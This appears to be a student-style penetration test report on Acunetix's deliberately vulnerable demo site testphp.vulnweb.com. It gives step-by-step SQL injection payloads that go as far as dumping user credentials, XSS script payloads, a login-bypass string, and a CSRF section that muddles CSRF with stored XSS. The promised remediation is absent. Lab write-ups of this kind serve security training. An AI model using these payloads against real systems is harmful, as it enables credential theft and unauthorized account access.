# Vulnerability Assessment and Penetration Testing (VAPT) for Home of Acunetix Art Web Application

## Objective

This report presents the findings and recommendations from a security assessment conducted on the **Home of Acunetix Art Web Application**. The objective of this assessment was to evaluate the application's security posture, identify vulnerabilities, and provide actionable mitigation strategies.

The assessment aimed to uncover security weaknesses within the Home of Acunetix Art Web Application and deliver a comprehensive final report detailing the identified vulnerabilities. Additionally, the report offers a remediation strategy and guideline recommendations to effectively mitigate the risks and enhance the application's security.

## Target Web Application

- **Name:** Home of Acunetix Art Web Application
- **URL:** [http://testphp.vulnweb.com/](http://testphp.vulnweb.com/)

## Vulnerability Analysis and Penetration Testing

### 1. SQL Injection

- **Tools Used:** VMware (To load the application), SQLMap (Conduct the Vulnerability assessment)
- **IP Address:** [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)

**Need for Check:**
SQL injection is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. By manipulating input data, an attacker can inject malicious SQL code into a query, potentially gaining unauthorized access to the database, retrieving sensitive information, modifying data, or even executing administrative operations.

**Analysis:**

1. Add `'` to the URL [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)
    - Result: mysql_fetch_array() error appears.
  
2. Modify the URL with `ORDER BY 3`
    - Result: Identifies the number of columns.

3. Modify the URL with `union select 1,2,3`
    - Result: Confirms which columns are vulnerable.

4. Modify the URL with `artist=1 union select 1,database(),version()`
    - Result: Displays database name and version.

5. Modify the URL with `artist=-1 union select count(*),3 from information_schema.tables where table_schema=”acuart”`
    - Result: Retrieves the count of tables.

6. Modify the URL with `union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”acuart” LIMIT 0,9`
    - Result: Displays table names.

7. Modify the URL with `union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=”acuart” and table_name=”users”`
    - Result: Retrieves column names from the `users` table.

8. Finally, modify the URL with `union select 1,group_concat("NAME = ",name,"  ","PASSWORD = ",pass,"  ","EMAIL = ",email,"  ","PHONE = ",phone),3 from users`
    - Result: Retrieves user credentials.

### 2. Cross-Site Scripting (XSS)

- **Tools Used:** VMware (Browser)
- **IP Address:** 
  - [http://testphp.vulnweb.com](http://testphp.vulnweb.com)
  - [http://testphp.vulnweb.com/guestbook.php](http://testphp.vulnweb.com/guestbook.php)

**Need for Check:**
Cross-Site Scripting (XSS) is a security vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users. These scripts can be used to steal sensitive information or manipulate website content.

**Analysis:**

1. On [http://testphp.vulnweb.com](http://testphp.vulnweb.com), type `<script>alert(1)</script>` in the search bar.
    - Result: The payload executes, showing an alert box.

2. On [http://testphp.vulnweb.com/guestbook.php](http://testphp.vulnweb.com/guestbook.php), type `<script>alert(1)</script>` and click "Add Message."
    - Result: The JavaScript executes, indicating a vulnerability.

### 3. Cross-Site Request Forgery (CSRF)

- **Tools Used:** VMware (Browser)
- **IP Address:** 
  - [http://testphp.vulnweb.com](http://testphp.vulnweb.com)
  - [http://testphp.vulnweb.com/guestbook.php](http://testphp.vulnweb.com/guestbook.php)

**Need for Check:**
Cross-Site Request Forgery (CSRF) tricks a user into performing unintended actions on a web application where they are authenticated. This can lead to unauthorized actions like changing account details.

**Analysis:**

1. The user visits the URL and signs up.
    - Result: JavaScript code is executed and stored on the server, allowing for request forgery.

### 4. Authentication Bypass

- **Tools Used:** VMware (Browser)
- **IP Address:** 
  - [http://testphp.vulnweb.com/login.php](http://testphp.vulnweb.com/login.php)
  - [http://testphp.vulnweb.com/guestbook.php](http://testphp.vulnweb.com/guestbook.php)

**Need for Check:**
Authentication bypass is a vulnerability that allows an attacker to gain unauthorized access by circumventing the authentication process.

**Analysis:**

1. Visit the target URL [http://testphp.vulnweb.com/login.php](http://testphp.vulnweb.com/login.php).
2. Enter `' or true #` in both the username and password fields and click "Login."
    - Result: Successfully logged into another person’s account.

---

This document outlines the steps taken during the VAPT process and the vulnerabilities identified in the Home of Acunetix Art Web Application. Recommendations for mitigating these vulnerabilities have been provided in the full report.
